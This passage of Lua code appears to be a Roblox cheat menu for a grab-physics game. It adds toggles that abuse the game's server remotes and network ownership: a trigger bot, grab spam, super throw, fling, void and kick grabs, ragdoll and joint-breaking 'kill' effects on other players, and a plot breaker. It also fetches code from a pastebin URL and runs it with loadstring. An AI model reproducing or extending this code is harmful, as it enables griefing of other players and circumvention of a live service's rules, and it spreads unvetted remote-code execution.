                for _,v in pairs(barrier:GetChildren()) do  
                    v.CanCollide = not Value
                    v.CanQuery = not Value
                end    
            end
        end
    })

    Toggles["AntiLag"] = DefTab:AddToggle({
        Name = "AntiLag",
        Default = false,
        Save = true,
        Flag = "AntiLag",
        Callback = function(Value)
            CountOfLines = 0
            AntiLineLag.Enabled = not Value
            AntiShuriLag.Enabled = not Value
        end
    })
    local LastLagSource = nil  
    local CountOfLines = 0 
    DefTab:AddToggle({
        Name = "Auto AntiLag",
        Default = true,
        Callback = function(Value)
        bool.AutoAntiLag = Value
    end
    })
    -- DefTab:AddToggle({
    --     Name = "AntiFling",
    --     Default = true,
    --     Callback = function(Value)
    --     bool.AntiFling = Value 
    --     for _,v in pairs(game.Players:GetPlayers()) do 
    --         if v == plr then continue end 
    --         local char = v.Character 
    --         if v.Character then  
    --             for _,x in pairs(char:GetDescendants()) do 
    --                 x.CanCollide = Value  
    --             end
    --         end
    --         local targetInv = workspace[v.Name.."SpawnedInToys"]
    --         for _,c in pairs(targetInv:GetChildren()) do 
    --             if c.Name == "YouDecoy" or c.Name == "PalletLightBrown" then  
    --                 for _,z in pairs(c:GetDescendants()) do 
    --                     if z:IsA("BasePart") then 
    --                         z.CanCollide = Value
    --                     end
    --                 end
    --             end
    --         end
    --     end
    -- end
    -- })

    DefTab:AddToggle({
        Name = "Anti-INPUTLAG[BURGER]",
        Default = false,
        Callback = function(Value)
            bool.AntiLagInput = Value
            if bool.AntiLagInput then 
                local burger = inv:FindFirstChild("FoodMayonnaise")
                local HoldPart = burger and burger:FindFirstChild("HoldPart")
                local DropItem,HoldItem
                while bool.AntiLagInput and task.wait() do 

                    if not char or not char:FindFirstChild("Left Arm") then continue end

                    HoldPart = burger and burger.Parent and burger:FindFirstChild("HoldPart")
                    DropItem,HoldItem = HoldPart and HoldPart:FindFirstChild("DropItemRemoteFunction"),HoldPart and HoldPart:FindFirstChild("HoldItemRemoteFunction")

                    if not HoldPart or not (DropItem and HoldItem) then   
                        for _,v in pairs(inv:GetChildren()) do  
                            if v.Name == "FoodMayonnaise" then  
                                DestroyToy:FireServer(v)
                            end
                        end
                        burger = SpawnToy("FoodMayonnaise")
                        if not burger then continue end 
                        HoldPart = FWD(burger,"HoldPart",1)
                        DropItem,HoldItem = HoldPart and FWD(HoldPart,"DropItemRemoteFunction",1), HoldPart and FWD(HoldPart,"HoldItemRemoteFunction",1)
                    end

                    task.spawn(function()
                        HoldItem:InvokeServer(burger,char)
                        while HoldPart and not HoldPart.RigidConstraint.Attachment1 do task.wait() end 
                        if HoldPart["RigidConstraint"].Attachment1 ~= char["Left Arm"].LeftGripAttachment then 
                            for _,v in pairs(inv:GetChildren()) do  
                                if v.Name == "FoodMayonnaise" then  
                                    DestroyToy:FireServer(v)
                                end
                            end
                            burger = nil
                        end
                    end)
                    task.wait(0.1)
                    task.spawn(DropItem.InvokeServer,DropItem,burger,char:GetPivot() * CFrame.new(0,500,0),Vector3.zero)
                end
            end
        end
    })
    DefTab:AddToggle({
        Name = "Anti-INPUTLAG[TEST,MB PINGY]",
        Default = false,
        Callback = function(Val)
            bool.AntiInputLag1 = Val 
            while bool.AntiInputLag1 and task.wait() do
                if hrp and not isnetworkowner(hrp) and not IsHeld.Value then  
                    RagdollRemote:FireServer(hrp,0)
                end
            end
        end
    })
    


    DefTab:AddButton({
        Name = "Bread ANTIKICK",
        Callback = function()
        local target = etc.MyPCLD or hrp.FirePlayerPart or hrp  
        local bread = SpawnToy("FoodBread")

        repeat
            game.ReplicatedStorage.GrabEvents.SetNetworkOwner:FireServer(bread.SoundPart,bread.SoundPart.CFrame)
            task.wait()
        until (not bread or not bread:FindFirstChild("SoundPart")) or bread.SoundPart:FindFirstChild("PartOwner")

        ChangeCollision(bread,false)
        task.spawn(function()
            while bread.Parent ~= nil do
                task.wait()
                bread.SoundPart.CFrame = target.CFrame * CFrame.Angles(math.rad(90), 0, 0)
                task.defer(StopAllVelocity,bread)
            end
        end)
        
        end    
    })

    DefTab:AddToggle({
        Name = "Perm ragdoll",
        Default = false,
        Callback = function(Val)
            bool.PermRag = Val 
            local char,hrp
            while bool.PermRag and task.wait(0.7) do
                hrp = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
                if not hrp then continue end 
                RagdollRemote:FireServer(hrp,1)
            end
        end
    })

local TriggerVars = {
    Enabled = false,
    Range = 150,
    Cooldown = 0.1,
    Connection = nil,
    LastGrab = 0
}

local rayParams = RaycastParams.new()
rayParams.FilterType = Enum.RaycastFilterType.Exclude

local vu = game:GetService("VirtualUser")
local Camera = workspace.CurrentCamera
local RunService = game:GetService("RunService")

local function TriggerGetTarget()
    local char = plr.Character
    if not char or not char:FindFirstChild("HumanoidRootPart") then return nil end
    if workspace:FindFirstChild("GrabParts") then return nil end

    local origin = Camera.CFrame.Position
    local dir = Camera.CFrame.LookVector * TriggerVars.Range

    rayParams.FilterDescendantsInstances = {char, workspace.Terrain}
    local result = workspace:Raycast(origin, dir, rayParams)
    if not result then return nil end

    local model = result.Instance:FindFirstAncestorOfClass("Model")
    if not model then return nil end

    local hum = model:FindFirstChildOfClass("Humanoid")
    if not hum or hum.Health <= 0 or model == char then return nil end

    return model
end

local function TriggerDoGrab()
    local now = tick()
    if now - TriggerVars.LastGrab < TriggerVars.Cooldown then return end
    TriggerVars.LastGrab = now

    task.spawn(function()
        local center = Camera.ViewportSize / 2
        pcall(function()
            vu:CaptureController()
            vu:Button1Down(center)
            task.wait(0.02)
            vu:Button1Up(center)
        end)
    end)
end

local function TriggerLoop()
    if not TriggerVars.Enabled then return end
    local target = TriggerGetTarget()
    if target then
        TriggerDoGrab()
    end
end

GrabTab:AddSection({ Name = "<b>Trigger Bot</b>" })

GrabTab:AddToggle({
    Name = "Trigger Bot Enabled",
    Default = false,
    Save = true,
    Callback = function(v)
        TriggerVars.Enabled = v
        if v then
            if TriggerVars.Connection then TriggerVars.Connection:Disconnect() end
            TriggerVars.Connection = RunService.Heartbeat:Connect(TriggerLoop)
        else
            if TriggerVars.Connection then
                TriggerVars.Connection:Disconnect()
                TriggerVars.Connection = nil
            end
        end
    end
})

GrabTab:AddSlider({
    Name = "Trigger Range",
    Min = 50, Max = 500, Default = 150,
    Increment = 5, ValueName = "studs",
    Callback = function(v) TriggerVars.Range = v end
})

GrabTab:AddSlider({
    Name = "Grab Cooldown",
    Min = 0.05, Max = 0.8, Default = 0.1,
    Increment = 0.05, ValueName = "sec",
    Callback = function(v) TriggerVars.Cooldown = v end
})

-- ==================== GrabTab - Strength Settings ====================

_G.GrabSpamEnabled = false
_G.GrabSpamCount = 100

local ContextActionService = game:GetService("ContextActionService")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local function fireGrabButton(state)
    local actions = ContextActionService:GetAllBoundActionInfo()
    for name, info in pairs(actions) do
        local lower = name:lower()
        if lower:find("grab") or lower:find("pick") or lower:find("hold") or lower:find("carry") then
            pcall(function()
                ContextActionService:CallFunction(name, state, nil)
            end)
        end
    end
end

GrabTab:AddSection({ Name = "<b>Consecutive</b>" })

-- 連打数設定
GrabTab:AddSlider({
    Name = "Number of consecutive hits",
    Min = 1,
    Max = 10000,
    Default = 100,
    Color = Color3.fromRGB(255, 255, 255),
    Increment = 1,
    ValueName = "line",
    Callback = function(Value)
        _G.GrabSpamCount = Value
    end
})

-- グラブ連打トグル（投げる力関連は完全削除）
GrabTab:AddToggle({
    Name = "Grab Consecutive",
    Default = false,
    Callback = function(Value)
        _G.GrabSpamEnabled = Value
        
        if Value then
            task.spawn(function()
                while _G.GrabSpamEnabled do
                    for i = 1, _G.GrabSpamCount do
                        if not _G.GrabSpamEnabled then break end
                        fireGrabButton(Enum.UserInputState.Begin)
                        fireGrabButton(Enum.UserInputState.End)
                        task.wait() -- 微小ディレイでやや自然に
                    end
                    RunService.Heartbeat:Wait()
                end
                fireGrabButton(Enum.UserInputState.End)
            end)
        else
            fireGrabButton(Enum.UserInputState.End)
        end
    end
})

GrabTab:AddSection({Name = "Strength Settings"})

GrabTab:AddToggle({
    Name = "Super Strength",
    Default = false,
    Save = true,
    Flag = "SuperStrength",
    Callback = function(Value)
        throwEnabled = Value
    end
})

GrabTab:AddSlider({
    Name = "Throw Strength",
    Min = 100,
    Max = 10000,
    Default = 1500,
    Color = Color3.fromRGB(255, 60, 60),
    Increment = 100,
    ValueName = "Strength",
    Save = true,
    Flag = "ThrowStrength",
    Callback = function(Value)
        throwStrength = Value
    end
})

-- ==================== 投げ処理関数 ====================
local function ApplySuperThrow(targetPart)
    if not throwEnabled or not targetPart then return end
    
    -- 既存のVelocityをクリア
    for _, v in pairs(targetPart:GetChildren()) do
        if v:IsA("BodyVelocity") or v:IsA("BodyAngularVelocity") then
            v:Destroy()
        end
    end

    local bv = Instance.new("BodyVelocity")
    bv.Name = "SuperThrow"
    bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
    bv.Velocity = workspace.CurrentCamera.CFrame.LookVector * throwStrength
    bv.Parent = targetPart

    Debris:AddItem(bv, 1.8)
end

Workspace.ChildAdded:Connect(function(child)
    if child.Name ~= "GrabParts" then return end

    local grabPart = child:WaitForChild("GrabPart", 1)
    local weldConstraint = grabPart and grabPart:FindFirstChild("WeldConstraint")
    
    if not weldConstraint then return end

    local targetPart = weldConstraint.Part1
    if not targetPart then return end

    -- 離した瞬間（Weldが破壊されたとき）を検知
    weldConstraint.AncestryChanged:Connect(function()
        if not weldConstraint.Parent then
            -- 離した瞬間！
            ApplySuperThrow(targetPart)
        end
    end)

    -- 保険：GrabParts自体が破壊された場合も対応
    child.AncestryChanged:Connect(function(_, parent)
        if not parent then
            ApplySuperThrow(targetPart)
        end
    end)
end)


    GrabTab:AddSection({Name = "line stretches"})
    
int.lineDistanceV = 20

Toggles["InfLineExtendT"] = GrabTab:AddToggle({
    Name = "line stretches",
    Default = false,
    Save = true,
    Flag = "InfLineExtendT",

    Callback = function(Value)

        if Value then

            cons["INFLINE"] = workspace.ChildAdded:Connect(function(child)

                if child.Name ~= "GrabParts" then
                    return
                end


                task.spawn(function()

                    local dragPart =
                        child:WaitForChild("DragPart",3)

                    if not dragPart then return end


                    local align =
                        dragPart:FindFirstChild("AlignPosition")

                    local attach =
                        dragPart:FindFirstChild("DragAttach")


                    if not align or not attach then
                        return
                    end


                    local cam =
                        workspace.CurrentCamera

                    local RunService =
                        game:GetService("RunService")


                    local conn

                    conn = RunService.RenderStepped:Connect(function()

                        if not child.Parent then
                            conn:Disconnect()
                            return
                        end


                        -- スライダー距離で伸びる
                        attach.WorldPosition =
                            cam.CFrame.Position
                            +
                            cam.CFrame.LookVector
                            *
                            int.lineDistanceV

                    end)


                    child.AncestryChanged:Connect(function()

                        if not child.Parent and conn then
                            conn:Disconnect()
                        end

                    end)

                end)

            end)

        else

            cons:disc("INFLINE")

        end

    end
})


GrabTab:AddSlider({

    Name = "Line Distance",

    Min = 5,
    Max = 100,

    Default = 50,

    Increment = 10,

    ValueName = " studs",

    Save = true,

    Flag = "InfinityDistance",

    Callback = function(Value)

        int.lineDistanceV = Value

    end
})

    GrabTab:AddSection({Name = "Pallet Sticker"})

GrabTab:AddToggle({
    Name = "Pallet sticker there",
    Default = false,
    Callback = function(Value)
        if Value then
            GrabUI = loadstring(game:HttpGet("https://pastebin.com/raw/3GPaFxdQ"))()
        else
            if typeof(GrabUI) == "Instance" then
                GrabUI:Destroy()
            elseif GrabUI and GrabUI.Destroy then
                pcall(function()
                    GrabUI:Destroy()
                end)
            end
            GrabUI = nil
        end
    end
})

    GrabTab:AddSection({Name = "Grabs Setting"})
    
    Toggles["KiKiGrab"] = GrabTab:AddToggle({
        Name = "Kick grab",
        Default = false,
        Save = true,
        Flag = "KiKiGrab",
        Callback = function(Value)
            if Value then 
                cons["KickGrab"] = workspace.ChildAdded:Connect(function(c)
                    if c.Name ~= "GrabParts" then return end
                    local GrabPart = c:WaitForChild("GrabPart", 0.1)
                    task.wait(0.1)
                    cons["kickgrabdestroy"] = c.Destroying:Once(function()
                        task.wait(0.1)
                        DestroyGrabLine:FireServer(part)
                    end)
                    local part = GrabPart.WeldConstraint.Part1
                    if game.Players:FindFirstChild(part.Parent.Name) then
                        while GrabPart and GrabPart.Parent do
                            DestroyGrabLine:FireServer(part)
                            RunService.RenderStepped:Wait()
                            SetNetworkOwner:FireServer(part, part.CFrame)
                            DestroyGrabLine:FireServer(part)
                            RunService.RenderStepped:Wait()
                            SetNetworkOwner:FireServer(part, part.CFrame)
                        end
                    end
                end)
            else 
                if cons["kickgrabdestroy"] then cons["kickgrabdestroy"]:Disconnect() cons["kickgrabdestroy"] = nil end
                if cons["KickGrab"] then cons["KickGrab"]:Disconnect() cons["KickGrab"] = nil end
            end
        end
    })

    Toggles["MassLessGrab"] = GrabTab:AddToggle({
        Name = "MassLessGrab",
        Default = false,
        Save = true,
        Flag = "MassLessGrab",
        Callback = function(Value)
            bool.MassLessGrab = Value
        end
    })


    Toggles["Sense"] = GrabTab:AddSlider({
        Name = "Slider",
        Min = 1,
        Max = 200,
        Default = 30,
        Color = Color3.fromRGB(255, 0, 255),
        Increment = 1,
        ValueName = "Sense",
        Save = true,
        Flag = "Sense",
        Callback = function(Value)
            int.Sense = Value
        end    
    })

    Toggles["SpinGrab"] = GrabTab:AddToggle({
        Name = "SpinGrab",
        Default = false,
        Save = true,
        Flag = "SpinGrab",
        Callback = function(Value)
            bool.SpinGrab = Value
        end
    })


    Toggles["RagdollGrab"] = GrabTab:AddToggle({
        Name = "Ragdoll Grab",
        Default = false,
        Save = true,
        Flag = "RagdollGrab",
        Callback = function(Value)
            bool.RagdollGrab = Value
            if Value then 
                local palete = inv:FindFirstChild("RagdollPalete")
                if not palete then 
                    palete = SpawnToy("PalletLightBrown")
                    if not palete then return end 
                    FWD(palete,"SoundPart")
                end
                local oldCF = char:GetPivot() 
                while not CheckNetworkOwnerOnPart(palete.SoundPart) and task.wait(0.05) do 
                    char:PivotTo(palete.SoundPart.CFrame)
                    sno(palete.SoundPart)
                end
                for _,v in pairs(palete:GetChildren()) do 
                    if v:IsA("BasePart") then 
                        v.Transparency = 0.8
                        v.CanCollide = false 
                        v.CanQuery = false
                    end
                end
                char:PivotTo(oldCF)
                palete.Name = "RagdollPalete"
                task.delay(1,RenameInShop,palete,"PalletLightBrown","Ragdoll")
                local bv = Instance.new("BodyVelocity")
                bv.MaxForce = Vector3.new(0,math.huge,0)
                bv.Velocity = Vector3.new(0,900,0)
                bv.Parent = palete.SoundPart
            else 
                cons:disc("Ragdoll")
            end
        end
    })

    Toggles["DeathGrab"] = GrabTab:AddToggle({
        Name = "DeathGrab",
        Default = false,
        Save = true,
        Flag = "DeathGrab",
        Callback = function(Value)
            bool.DeathGrab = Value
        end
    })

    Toggles["CrazyGrab"] = GrabTab:AddToggle({
        Name = "CrazyGrab",
        Default = false,
        Save = true,
        Flag = "CrazyGrab",
        Callback = function(Value)
            bool.CrazyGrab = Value
        end
    })

bool.KickGrab = false

local KickGrabConn = nil
local KickTarget = nil

local SkyHeight = 300
local KickPower = 900

workspace.ChildAdded:Connect(function(obj)

    if obj.Name ~= "GrabParts" then return end

    task.wait(0.1)

    local grab = obj:FindFirstChild("GrabPart")

    if grab then

        local weld = grab:FindFirstChild("WeldConstraint")

        if weld and weld.Part1 then
            KickTarget = weld.Part1
        end

    end

end)


workspace.ChildRemoved:Connect(function(obj)

    if obj.Name == "GrabParts" then
        KickTarget = nil
    end

end)



local function StartKickGrab()

    if KickGrabConn then
        KickGrabConn:Disconnect()
    end


    KickGrabConn = RunService.Heartbeat:Connect(function()

        if not bool.KickGrab then return end

        if not KickTarget then return end

        if not KickTarget.Parent then
            KickTarget=nil
            return
        end


        local char = plr.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")

        if not hrp then return end



        local bv =
        KickTarget:FindFirstChild("KickGrabForce")


        if not bv then

            bv = Instance.new("BodyVelocity")

            bv.Name="KickGrabForce"

            bv.MaxForce =
            Vector3.new(
                math.huge,
                math.huge,
                math.huge
            )

            bv.Parent = KickTarget

        end



        -- 天空へ

        if KickTarget.Position.Y < SkyHeight then

            bv.Velocity =
            Vector3.new(
                0,
                KickPower,
                0
            )

        else

            -- 遠くへ → 戻す

            local dir =
            (hrp.CFrame.LookVector)


            bv.Velocity =
            dir * KickPower


        end


    end)

end



local function StopKickGrab()

    if KickGrabConn then
        KickGrabConn:Disconnect()
        KickGrabConn=nil
    end


    if KickTarget then

        local bv =
        KickTarget:FindFirstChild("KickGrabForce")

        if bv then
            bv:Destroy()
        end

    end


    KickTarget=nil

end



Toggles["KickGrab"] = GrabTab:AddToggle({

Name="Fling Grab",

Default=false,

Save=true,

Flag="KickGrab",

Callback=function(Value)

    bool.KickGrab=Value


    if Value then
        StartKickGrab()
    else
        StopKickGrab()
    end

end

})



bool.VoidGrab = false

local VoidGrabConn = nil

local VoidGrabPower = 1500
local VoidGrabRange = 45


local function StartVoidGrab()

    if VoidGrabConn then
        VoidGrabConn:Disconnect()
    end


    VoidGrabConn = RunService.Heartbeat:Connect(function()

        if not bool.VoidGrab then return end


        local char = plr.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")

        if not hrp then return end



        for _,p in ipairs(Players:GetPlayers()) do

            if p ~= plr and p.Character then

                local root =
                p.Character:FindFirstChild("HumanoidRootPart")


                if root then

                    local dist =
                    (root.Position - hrp.Position).Magnitude


                    if dist <= VoidGrabRange then


                        -- GrabParts検知用の処理

                        local bv =
                        root:FindFirstChild("VoidGrabForce")


                        if not bv then

                            bv = Instance.new("BodyVelocity")

                            bv.Name = "VoidGrabForce"

                            bv.MaxForce =
                            Vector3.new(
                                math.huge,
                                math.huge,
                                math.huge
                            )

                            bv.Parent = root

                        end



                        -- 下に落とす

                        bv.Velocity =
                        Vector3.new(
                            0,
                            -VoidGrabPower,
                            0
                        )


                    end

                end

            end

        end

    end)

end



local function StopVoidGrab()

    if VoidGrabConn then
        VoidGrabConn:Disconnect()
        VoidGrabConn=nil
    end

end



Toggles["VoidGrab"] = GrabTab:AddToggle({

    Name = "Void Grab",

    Default = false,

    Save = true,

    Flag = "VoidGrab",

    Callback = function(Value)

        bool.VoidGrab = Value

        if Value then
            StartVoidGrab()
        else
            StopVoidGrab()
        end

    end

})

-- GrabTab に追加
GrabTab:AddSection({ Name = "<b>Plot Breaker</b>" })

Toggles["BreakAllPlots"] = GrabTab:AddToggle({
    Name = "Break All Plots (1-5)",
    Default = false,
    Save = true,
    Flag = "BreakAllPlots",
    Callback = function(Value)
        bool.BreakAllPlots = Value
        
        if Value then
            task.spawn(function()
                for i = 1, 5 do
                    if not bool.BreakAllPlots then break end
                    
                    local currentHRP = hrp
                    if not currentHRP then
                        currentHRP = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
                        if not currentHRP then continue end
                    end

                    -- NinjaShurikenをスポーン
                    local shur = SpawnToy("NinjaShuriken")
                    if not shur then
                        -- フォールバック
                        local inv = workspace:FindFirstChild(plr.Name.."SpawnedInToys")
                        if inv then
                            local conn
                            conn = inv.ChildAdded:Connect(function(child)
                                if child.Name == "NinjaShuriken" then
                                    shur = child
                                    conn:Disconnect()
                                end
                            end)
                            SpawnToyRemote:InvokeServer("NinjaShuriken", currentHRP.CFrame * CFrame.new(5, 8, 20), Vector3.new(0, 0, 0))
                            local start = tick()
                            repeat task.wait(0.01) until shur or (tick() - start > 0.6)
                            if conn then conn:Disconnect() end
                            shur = shur or inv:FindFirstChild("NinjaShuriken")
                        end
                    end

                    if shur and shur.Parent then
                        local soundPart = shur:FindFirstChild("SoundPart")
                        local stickyPart = shur:FindFirstChild("StickyPart")

                        if soundPart and stickyPart then
                            -- 所有権取得
                            for j = 1, 15 do
                                if not bool.BreakAllPlots then break end
                                sno(soundPart)
                                if soundPart:FindFirstChild("PartOwner") and soundPart.PartOwner.Value == plr.Name then
                                    break
                                end
                                task.wait(0.03)
                            end

                            -- ノークリップ化
                            for _, obj in pairs(shur:GetChildren()) do
                                if obj:IsA("BasePart") then
                                    obj.CanTouch = false
                                    obj.CanCollide = false
                                    obj.Transparency = 1
                                end
                            end
                            shur.Name = "Noclipped"

                            -- Plotに貼り付けて破壊
                            local plot = workspace.Plots:FindFirstChild("Plot" .. i)
                            if plot then
                                local plotArea = plot:FindFirstChild("PlotArea")
                                if plotArea then
                                    StickyEvent:FireServer(stickyPart, plotArea, CFrame.new(1e12, 1e12, 1e12))
                                end
                            end
                        end
                    end

                    task.wait(0.12)
                end
                
                if bool.BreakAllPlots then
                    Notify("Plot Breaker", "All Plots (1-5) processed.")
                end
            end)
        end
    end
})

    GrabTab:AddSection({
        Name = "掴まれたら〇〇"
    })
    
-- === 自分が掴まれたら相手を奈落に叩き落とす ===
GrabTab:AddToggle({
    Name = "掴まれたら暴れさせる <font color=\"rgb(255, 50, 50)\"><b>[CHAOS]</b></font>",
    Default = false,
    Save = true,
    Flag = "SelfDefenseKick",
    Callback = function(enabled)
        if enabled then
            cons["SelfDefenseKick"] = RunService.Heartbeat:Connect(function()
                if not IsHeld.Value or not head then
                    if hrp.Anchored then hrp.Anchored = false end
                    return
                end

                local partOwner = head:FindFirstChild("PartOwner")
                if not (partOwner and partOwner.Value ~= plr.Name) then
                    if hrp.Anchored then hrp.Anchored = false end
                    return
                end

                local attacker = Players:FindFirstChild(partOwner.Value)
                if not (attacker and attacker.Character) then
                    if hrp.Anchored then hrp.Anchored = false end
                    return
                end

                local targetHRP = attacker.Character:FindFirstChild("HumanoidRootPart")
                if not targetHRP then 
                    if hrp.Anchored then hrp.Anchored = false end
                    return 
                end

                -- ==================== AntiGrab（自分が動けるように） ====================
                hrp.Anchored = true
                Struggle:FireServer("Unbind")
                StopVelocityF()

                hum.Sit = false
                hum.AutoRotate = true

                -- 軽く移動して抵抗
                if not bool.WalkSpeed and hum.MoveDirection.Magnitude > 0 then
                    hrp.CFrame = hrp.CFrame + (hum.MoveDirection * 0.35)
                end

                -- ==================== 相手を奈落に落とす ====================
                sno(targetHRP)
                
                -- 即座に強力落下
                local bv = Instance.new("BodyVelocity")
                bv.Name = "DefenseBlast"
                bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                bv.Velocity = Vector3.new(0, -950, 0)
                bv.Parent = targetHRP
                task.spawn(function()
                    for i = 1, 18 do
                        if targetHRP and targetHRP.Parent then
                            targetHRP.AssemblyLinearVelocity = Vector3.new(0, -1400 - i * 70, 0)
                        end
                        task.wait(0.04)
                    end
                end)

                Debris:AddItem(bv, 5)
            end)
        else
            cons:disc("SelfDefenseKick")
            
            for _, v in pairs(workspace:GetDescendants()) do
                if v.Name == "DefenseBlast" then
                    v:Destroy()
                end
            end
            
            if hrp then 
                hrp.Anchored = false 
            end
        end
    end
})

GrabTab:AddToggle({
    Name = "掴まれたらキルする <font color=\"rgb(255, 100, 100)\"><b>[RAGDOLL]</b></font>",
    Default = false,
    Save = true,
    Flag = "LegRemover",
    Callback = function(enabled)
        if enabled then
            cons["LegRemover"] = RunService.Heartbeat:Connect(function()
                if not IsHeld.Value or not head then 
                    if hrp.Anchored then hrp.Anchored = false end
                    return 
                end

                local partOwner = head:FindFirstChild("PartOwner")
                if not (partOwner and partOwner.Value ~= plr.Name) then 
                    if hrp.Anchored then hrp.Anchored = false end
                    return 
                end

                local attacker = Players:FindFirstChild(partOwner.Value)
                if not (attacker and attacker.Character) then 
                    if hrp.Anchored then hrp.Anchored = false end
                    return 
                end

                local char = attacker.Character
                local targetHRP = char:FindFirstChild("HumanoidRootPart")
                local targetHum = char:FindFirstChild("Humanoid")
                
                if not (targetHRP and targetHum) then 
                    if hrp.Anchored then hrp.Anchored = false end
                    return 
                end

                -- ==================== AntiGrab ====================
                hrp.Anchored = true
                Struggle:FireServer("Unbind")
                StopVelocityF()

                hum.Sit = false
                hum.AutoRotate = true

                if not bool.WalkSpeed and hum.MoveDirection.Magnitude > 0 then
                    hrp.CFrame = hrp.CFrame + (hum.MoveDirection * 0.35)
                end

                -- ==================== 相手を強制ラグドール ====================
                sno(targetHRP)           -- 所有権確保（超重要）
                task.wait(0.025)

                -- ラグドール化の核心
                targetHum.PlatformStand = true
                targetHum.Sit = true
                targetHum.AutoRotate = false
                
                -- 全身のJointを破壊（これが一番効く）
                char:BreakJoints()
                
                -- 足だけでなく主要な関節も破壊
                for _, motor in ipairs(char:GetDescendants()) do
                    if motor:IsA("Motor6D") then
                        if motor.Name:find("Leg") or motor.Name:find("Foot") or 
                           motor.Name:find("Arm") or motor.Name:find("Hand") or 
                           motor.Name == "RootJoint" or motor.Name == "Neck" then
                            motor:Destroy()
                        end
                    end
                end

                -- さらに強力に（保険）
                task.spawn(function()
                    task.wait(0.05)
                    if char and char.Parent then
                        for _, part in pairs(char:GetChildren()) do
                            if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
                                part.CanCollide = false
                                part.AssemblyLinearVelocity = Vector3.new(math.random(-20,20), -30, math.random(-20,20))
                            end
                        end
                    end
                end)
            end)
        else
            cons:disc("LegRemover")
            if hrp then hrp.Anchored = false end
        end
    end
})
    
GrabTab:AddToggle({
    Name = "掴まれたら飛ばす <font color=\"rgb(255, 100, 255)\"><b>[VOID]</b></font>",
    Default = false,
    Save = true,
    Flag = "SelfDefenseKick",
    Callback = function(enabled)
        if enabled then
            
            cons["SelfDefenseKick"] = RunService.Heartbeat:Connect(function()
                if not IsHeld.Value or not head then 
                    if hrp.Anchored then hrp.Anchored = false end
                    return 
                end

                local partOwner = head:FindFirstChild("PartOwner")
                if not partOwner or partOwner.Value == plr.Name then 
                    if hrp.Anchored then hrp.Anchored = false end
                    return 
                end

                local attacker = Players:FindFirstChild(partOwner.Value)
                if not (attacker and attacker.Character and attacker.Character:FindFirstChild("HumanoidRootPart")) then 
                    if hrp.Anchored then hrp.Anchored = false end
                    return 
                end

                -- ==================== AntiGrab (自分側) ====================
                hrp.Anchored = true
                Struggle:FireServer("Unbind")
                StopVelocityF()

                hum.Sit = false
                hum.AutoRotate = true

                -- 少し前進して脱出しやすくする（WalkSpeed設定時は無効）
                if not bool.WalkSpeed and hum.MoveDirection.Magnitude > 0 then
                    hrp.CFrame = hrp.CFrame + (hum.MoveDirection * 0.4)
                end

                -- ==================== 攻撃者を飛ばす (VOID) ====================
                local targetHRP = attacker.Character.HumanoidRootPart
                sno(targetHRP)

                local bv = Instance.new("BodyVelocity")
                bv.Name = "DefenseUpperBlast"
                bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                bv.Velocity = Vector3.new(0, 1250, 0)
                bv.Parent = targetHRP

                local bg = Instance.new("BodyGyro")
                bg.Name = "DefenseStabilizer"
                bg.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
                bg.P = 3000
                bg.D = 500
                bg.CFrame = targetHRP.CFrame
                bg.Parent = targetHRP

                task.spawn(function()
                    for i = 1, 12 do
                        if targetHRP and targetHRP.Parent then
                            bv.Velocity = Vector3.new(0, 1250 + i * 90, 0)
                        end
                        task.wait(0.07)
                    end
                end)

                Debris:AddItem(bv, 6)
                Debris:AddItem(bg, 6)
            end)

        else
            cons:disc("SelfDefenseKick")
            
            -- 掃除
            for _, obj in ipairs(workspace:GetDescendants()) do
                if obj.Name == "DefenseUpperBlast" or obj.Name == "DefenseStabilizer" then
                    obj:Destroy()
                end
            end
            
            if hrp then 
                hrp.Anchored = false 
            end
        end
    end
})

GrabTab:AddSection({
        Name = "Advanced Line Mods"
    })

    GrabTab:AddToggle({
        Name = "RGB line[FE]",
        Default = false,
        Callback = function(Value)
            bool.RGBLine = Value
            while bool.RGBLine do
                local args = {
                    [1] = ColorSequence.new{
                        ColorSequenceKeypoint.new(0.0, Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))),
                        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))),
                        ColorSequenceKeypoint.new(1, Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255)))
                    }
                }
                SetLineColor:FireServer(unpack(args))
                task.wait(0.1)
            end
        end
    })
    GrabTab:AddToggle({
        Name = "Invisible Line",
        Default = false,
        Save = true,
        Flag = "InvisibleLineFeature",
        Callback = function(Value)
            bool.InvisLine = Value
        end
    })
    workspace.ChildAdded:Connect(function(child)
        if child.Name == "GrabParts" then 
            local Weld = FWD(FWD(child,"GrabPart",5),"WeldConstraint",5)
            local GrabPart = Weld and Weld.Part1
            local Parent = GrabPart and GrabPart.Parent 
            local Root = Parent and Parent:FindFirstChild("HumanoidRootPart")
            if bool.InvisLine then 
                CreateGrabLine:FireServer()
            end
            if bool.CrazyGrab and Root then 
                task.spawn(function()
                    while CFP(workspace,"GrabParts") do 
                        Root.CFrame = CFrame.new(0,-20,0)
                        task.wait(0.05)
                        Root.CFrame = CFrame.new(1e9,-20,0)
                        task.wait(0.05)
                        Root.CFrame = CFrame.new(-1e9,-20,0)
                        task.wait(0.05)
                        Root.CFrame = CFrame.new(1e9,-20,1e9)
                        task.wait(0.05)
                        Root.CFrame = CFrame.new(1e9,-20,-1e9)
                        task.wait(0.05)
                        Root.CFrame = CFrame.new(0,-20,1e9)
                        task.wait(0.05)
                        Root.CFrame = CFrame.new(1e9,1e9,1e9)
                        task.wait(0.05)
                    end
                end)
            end
            if bool.DeathGrab and Root then 
                task.spawn(function()
                    while not CheckNetworkOwnerOnPlayer(nil,Root) and CFP(workspace,"GrabParts") do task.wait() end
                    _G.ForceDeath(Root,Parent:FindFirstChildOfClass("Humanoid"))
                    unsno(Root)
                end)
            end
            if Root and bool.RagdollGrab then 
                task.spawn(function()
